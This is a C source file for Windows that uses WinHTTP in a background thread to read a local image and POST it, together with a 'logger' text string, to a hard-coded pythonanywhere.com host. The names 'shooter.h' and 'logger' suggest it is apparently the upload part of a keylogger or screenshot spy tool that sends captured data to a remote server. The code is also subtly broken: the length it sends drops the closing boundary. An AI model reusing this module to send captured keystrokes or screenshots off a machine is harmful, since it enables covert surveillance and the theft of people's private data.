// send.c: send post request asynchronously
// This part of this program is heavily based of https://learn.microsoft.com/en-us/windows/win32/procthread/creating-threads this example
// Understand that example before attempting to edit this code

#include <windows.h>
#include "C:\Users\ASUS\Downloads\mingw-w64-v11.0.0\mingw-w64-v11.0.0\mingw-w64-headers\include\winhttp.h"
#include <stdio.h>
#include "shooter.h"

#pragma comment(lib, "winhttp.lib")

const char boundary[] = "----WebKitFormBoundary7MA4YWxkTrZu0gW";    // way to split our data 


//int xender(const char *filename, char logger[])     // function for thread to call
DWORD WINAPI Xend(LPVOID param)     // function for thread to call
{
    // make pointer for function to use
    // this function expects pointers to the param and create thread accepted this fgucntion with LPVOID
    // this is void, we cannot derefence void pointers. we first have to cast to our custom datatype
    DataToSend* data = (DataToSend*)param;
        // start session
    //https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen
    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 0);
        // if session has failed to start
    if(!hSession)
    {
        {
            printf("Failed to start session");
            return 1;
        }
    }

    //specify server to connect to
    // https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
    HINTERNET hConnect = WinHttpConnect( hSession, L"yueh33455.pythonanywhere.com", 80, 0);
    // check if connection was succesful if not, break
    if(hConnect == NULL)
    {   
        printf("Could't connect");
        return 2;
    }


    // https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest
    //create requests
    HINTERNET hRequest = WinHttpOpenRequest( hConnect, L"POST", NULL, 
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,0);
    if(hRequest == NULL)
    {
        printf("Cannot create request");
        return 3;
    }



        FILE *outfile = fopen(data->filename, "rb");   
        if(!outfile)
        {
            printf("Cannot load image");
            return 4;
        }
        // Get the file size
        fseek(outfile, 0, SEEK_END);
        long fileSize = ftell(outfile);
        fseek(outfile, 0, SEEK_SET);

          // Allocate buffer to hold image data
    char *imageData = (char *)malloc(fileSize);
    if (!imageData) {
        printf("Failed to allocate memory for image data\n");
        fclose(outfile);
        return 1;
    }

    // Read the image into the buffer
    fread(imageData, 1, fileSize, outfile);
    fclose(outfile);


    // Prepare the multipart body
    const char* text = data->logger;
    size_t textLength = strlen(text) + 1; // Example text
    size_t totalLength = strlen(boundary) * 2 + textLength + fileSize + 1000; // Additional space for headers and boundaries

       // Allocate buffer for the full multipart body
       char *postData = (char *)malloc(totalLength);
       if (!postData) {
           printf("Failed to allocate memory for post data\n");
           free(imageData);
           return 6;
       }


           // Build the multipart/form-data body
    char *p = postData;


    
    // Add the first boundary and text part
    p += sprintf(p, "--%s\r\n", boundary);
    p += sprintf(p, "Content-Disposition: form-data; name=\"text\"\r\n\r\n");
    p += sprintf(p, "%s\r\n", text);

    // Add the second boundary and file part
    p += sprintf(p, "--%s\r\n", boundary);
    p += sprintf(p, "Content-Disposition: form-data; name=\"file\"; filename=\"image.jpeg\"\r\n");
    p += sprintf(p, "Content-Type: image/jpeg\r\n\r\n");

    // Copy the image data into the buffer
    memcpy(p, imageData, fileSize);
    p += fileSize;

    // End the multipart data with the final boundary
    sprintf(p, "\r\n--%s--\r\n", boundary);



  // Send a request.
    BOOL bResults = WinHttpSendRequest( hRequest,
                                   WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   postData, (DWORD)(p - postData), 
                                   (DWORD)(p - postData), 0);
        
    if(bResults)
    {
        printf("sent");
    }

        

      // Close any open handles.
    if( hRequest ) WinHttpCloseHandle( hRequest );
    if( hConnect ) WinHttpCloseHandle( hConnect );
    if( hSession ) WinHttpCloseHandle( hSession );
    return 0;
}